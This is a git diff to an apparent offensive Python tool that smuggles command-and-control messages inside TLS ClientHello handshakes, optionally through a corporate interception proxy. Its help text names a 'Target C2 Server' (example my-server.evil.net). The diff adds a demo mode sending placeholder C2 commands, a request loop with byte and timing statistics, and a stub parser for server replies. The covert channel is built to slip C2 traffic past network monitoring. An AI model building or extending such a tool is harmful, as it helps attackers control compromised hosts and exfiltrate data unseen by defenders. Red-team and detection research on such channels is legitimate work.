@@ -214,7 +214,7 @@ def tls_client_hello(sock):
 
 def connect_proxy(proxy_host: str, server: str) -> socket.socket:
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print(f"+ Connecting to proxy: {proxy_host} ...")
+    print(f"[+] Connecting to proxy: {proxy_host} ...")
     sock.connect((urlparse(proxy_host).hostname, urlparse(proxy_host).port))
     port = 443
     try:
@@ -253,14 +253,13 @@ def send_message(sock: socket.socket, byte_stream: bytes) -> bytes:
     return sock.recv(16384)
 
 
+def parse_server_hello(response_bytes: bytes) -> str:
+    """Extracts SAN message from response bytes"""
+    # TODO: write this!
+    return "_TODO_"
+
+
 if __name__ == "__main__":
-    # sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    # proxy_send("_HOST_",443)
-
-    # is_connected = proxy_connect
-    # send_raw.proxy_connect(socket.socket(socket.AF_INET, socket.SOCK_STREAM),'_HOST_')
-
-    # new shiz
     arg_parse = argparse.ArgumentParser(
         description="Send and Receive messages via TLS Handshakes through an interception proxy"
     )
@@ -273,6 +272,13 @@ if __name__ == "__main__":
         help="Intercepting HTTP Proxy to use, Example: http://proxy.company.com:8080/",
     )
     arg_parse.add_argument(
+        "-d",
+        "--demo",
+        metavar="demo",
+        required=False,
+        help="A simple demonstration that runs a couple benign C2 commands",
+    )
+    arg_parse.add_argument(
         "-s",
         "--server",
         metavar="server",
@@ -280,7 +286,7 @@ if __name__ == "__main__":
         help="Target C2 Server you want to connect to, Example: my-server.evil.net",
     )
     args = arg_parse.parse_args()
-    if not args.message:
+    if not args.message and not args.demo:
         arg_parse.error("Error: No message was supplied")
         exit(1)
     if not args.server:
@@ -298,10 +304,40 @@ if __name__ == "__main__":
     # Proxy CONNECT PHASE
     prox_start_time_ns = int(time.time_ns())
     # proxy_socket = connect_proxy(args.proxy.lower(), args.server.lower())
+    # TODO: For testing, skip the Proxy and connet direct
     proxy_socket = connect_direct(args.server.lower())
     prox_end_time_ns = int(time.time_ns())
-
-    t = TLSClientHandshake(args.message)
-    response = send_message(proxy_socket, t.to_byte_stream())
-    # TODO: handle the response
-    print(str(response))
+    if type(proxy_socket) != socket.socket:
+        exit(1)
+    reqs_list_str = []
+    reqs_list_byte_stream = []
+    if not args.demo:
+        reqs_list_str.append(args.message)
+        reqs_list_byte_stream.append(TLSClientHandshake(args.message).to_byte_stream())
+    else:
+        reqs_list_str.append("DEMO_CMD_1")
+        reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_1").to_byte_stream())
+        reqs_list_str.append("DEMO_CMD_2")
+        reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_2").to_byte_stream())
+    response_parsed_list = []
+    response_bytes_list = []
+    tls_start_time_ns = int(time.time_ns())
+    for k, v in enumerate(reqs_list_byte_stream):
+        print(f" > '{reqs_list_str[k]}' [{len(v)} bytes]")
+        resp_bytes = send_message(proxy_socket, v)
+        response_bytes_list.append(resp_bytes)
+        resp_parsed = parse_server_hello(resp_bytes)
+        response_parsed_list.append(resp_parsed)
+        print(f" < '{resp_parsed}' [{len(resp_bytes)} bytes]")
+    proxy_socket.close()
+    tls_end_time_ns = int(time.time_ns())
+    sent_bytes = sum(map(len, reqs_list_byte_stream))
+    recv_bytes = sum(map(len, response_bytes_list))
+    total_time_ms = int((prox_end_time_ns - prox_start_time_ns) / NS_TO_MS) + int(
+        (tls_end_time_ns - tls_start_time_ns) / NS_TO_MS
+    )
+    print(
+        f"[+] Requests: {len(reqs_list_str)}, Bytes Sent: {sent_bytes}, Bytes Recv: {recv_bytes}, Time: {total_time_ms}ms [{round((total_time_ms/1000),2)}s]"
+    )
+    print("Exiting.")
+    exit(0)
